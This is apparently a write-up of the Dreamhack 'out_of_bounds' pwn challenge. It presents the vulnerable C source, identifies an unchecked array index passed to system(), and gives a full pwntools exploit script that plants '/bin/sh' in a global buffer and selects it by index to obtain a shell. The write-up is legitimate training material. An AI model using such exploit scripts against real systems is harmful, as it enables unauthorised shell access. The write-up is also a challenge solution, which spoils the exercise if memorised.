# out_of_bounds - Dreamhack
## Challenge Info
- Date: 2025
- CTF Name: Dreamhack
- Category: pwn
- Difficulty (subjective): easy
- Points: 1
- Provided Files: out_of_bounds.c, out_of_bounds(ELF)
- tools: 
## Brief Description
이 문제는 서버에서 작동하고 있는 서비스(out_of_bound)의 바이너리와 소스 코드가 주어집니다.
프로그램의 취약점을 찾고 익스플로잇해 셸을 획득하세요.
"flag" 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.
## Initial Analysis
### Environment
``` sh
checksec out_of_bounds
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```
### Code
``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16]; // bss

char *command[10] = { // data
    "cat", // rodata
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```
## Vulnerability
### OOB(Out of Bounds)
``` c
scanf("%d", &idx);
system(command[idx]);
```
`idx`의 값을 검증하지 않아 OOB 취약점이 발생한다.  
## Exploit
### Strategy
PIE가 비활성화 되어있어 bss, data 영역의 주소는 고정된다. 전역 변수인 `name`과 `command`는 각각 bss와 data 영역에 위치하게 되지만, 두 세그먼트는 연속적으로 저장된다. data -> .bss 순으로 붙어 있기 때문에 주소가 가까울 것이라고 예상할 수 있다. `name`에 `"/bin/sh\x00"` + `name addr`를 저장하고, `idx`에 `name addr`가 있는 부분으로 인덱스를 알맞게 전달하면 `system(command[name_addr offset])` 즉, `system("/bin/sh")`을 실행할 수 있다.
### Exploitation Steps
``` sh
pwndbg> info variables name
0x0804a0ac  name
pwndbg> info variables command
0x0804a060  command
```
### payload
``` python
from pwn import *

p = remote('host8.dreamhack.games', 13363)
context.arch = "i386"

# name = "/bin/sh\x00"
name = 0x0804a0ac
command = 0x0804a060
payload = b'/bin/sh\x00' + p32(name) # 8 + 4 = 12byte
p.sendlineafter(b'Admin name: ', payload)

# idx
idx = (name - command) // 4 + 2 # 76 // 4 + 2 = 21
p.recvuntil(b'What do you want?: ')
p.sendline(str(idx).encode())

# interactive
p.interactive()
```
